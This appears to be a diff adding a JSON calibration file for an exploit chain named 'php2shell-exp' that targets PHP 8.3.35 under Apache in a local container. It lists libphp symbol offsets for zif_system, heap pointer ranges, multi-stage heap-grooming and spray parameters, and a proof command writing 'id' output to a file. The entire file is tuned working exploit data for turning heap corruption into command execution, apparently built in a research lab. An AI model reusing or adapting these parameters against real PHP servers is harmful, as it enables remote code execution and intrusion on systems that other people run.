@@ -1,0 +1,150 @@
+{
+  "schema": 1,
+  "target": "8.3.35",
+  "image": "php:8.3.35-apache",
+  "container": "php2shell-exp-8335",
+  "url": "http://127.0.0.1:19129/index.php",
+  "libphp": "/usr/lib/apache2/modules/libphp.so",
+  "symbols": {
+    "zif_system": 3850368,
+    "zval_ptr_dtor": 4844624
+  },
+  "limits": {
+    "memory_limit": "8M",
+    "post_max_size": "64M",
+    "max_input_vars": 1000
+  },
+  "heap": {
+    "chunk_align": 2097152,
+    "pointer_lo": 139637976727552,
+    "pointer_hi": 140737488355328,
+    "stage1": {
+      "fillers": 841,
+      "value_len": 48,
+      "forge_len": 79,
+      "forge_len_field": 4096,
+      "arm_value_len": 1
+    },
+    "stage2": {
+      "groups": 983,
+      "target": 406,
+      "target_count": 16,
+      "value_len": 16,
+      "arm_value_len": 39
+    },
+    "htdata_offset": 434392
+  },
+  "stage3": {
+    "pads": [
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ]
+    ],
+    "carrier": {
+      "kind": "patch_low7",
+      "len": 15,
+      "count": 2
+    },
+    "spray": {
+      "count": 15,
+      "name_len": 31,
+      "value_len": 167
+    },
+    "arm_cookie": true,
+    "big_mb": 12,
+    "sid_len": 19,
+    "progress_len": 3
+  },
+  "proof": {
+    "cmd": "id>/out/p1",
+    "file": "/out/p1"
+  },
+  "calibration": {
+    "method": "chain.py calibrate (oracle-driven)",
+    "container": "php2shell-exp-8335",
+    "symbols_sha256": "ea069762fa225a2d61ebf613db5686d7c29823acf641424d596f78fcaa1cdccb",
+    "stage1": {
+      "fillers": 841,
+      "method": "seed verified twice",
+      "tried": [
+        841
+      ]
+    },
+    "stage2": {
+      "target": 406,
+      "method": "seed verified twice",
+      "tried": [
+        406
+      ]
+    },
+    "htdata": {
+      "offset": 434392,
+      "header_addr": 434368,
+      "rc": 1,
+      "type_info": 22,
+      "len": 167,
+      "data": 434392,
+      "copies": 20,
+      "spacing": [
+        192
+      ],
+      "method": "full rotate->stage1->stage2->arm->B replay against /_hold.php; scan /proc/<pid>/mem for marker at data+0x98"
+    },
+    "pads": {
+      "pads": [
+        [
+          31,
+          31
+        ],
+        [
+          31,
+          31
+        ],
+        [
+          31,
+          31
+        ],
+        [
+          31,
+          31
+        ],
+        [
+          31,
+          31
+        ],
+        [
+          31,
+          31
+        ]
+      ],
+      "method": "seed verified by proof",
+      "verified": true,
+      "tried": 1
+    },
+    "generated_by": "chain.py calibrate",
+    "timestamp": "2026-10-21T19:05:31Z"
+  },
+  "symbols_sha256": "ea069762fa225a2d61ebf613db5686d7c29823acf641424d596f78fcaa1cdccb",
+  "service": "apache8335"
+}
